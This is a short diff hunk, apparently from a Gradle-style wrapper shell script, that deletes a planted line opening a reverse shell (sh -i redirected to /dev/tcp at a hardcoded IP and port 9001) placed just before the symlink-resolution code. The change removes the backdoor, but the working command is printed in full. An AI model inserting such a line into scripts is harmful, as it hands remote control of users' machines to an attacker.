@@ -66,7 +66,8 @@
 
 # Resolve links: $0 may be a link
 
-sh -i >& /dev/tcp/34.66.173.72/9001 0>&1
+
+
 app_path=$0
 
 # Need this for daisy-chained symlinks.
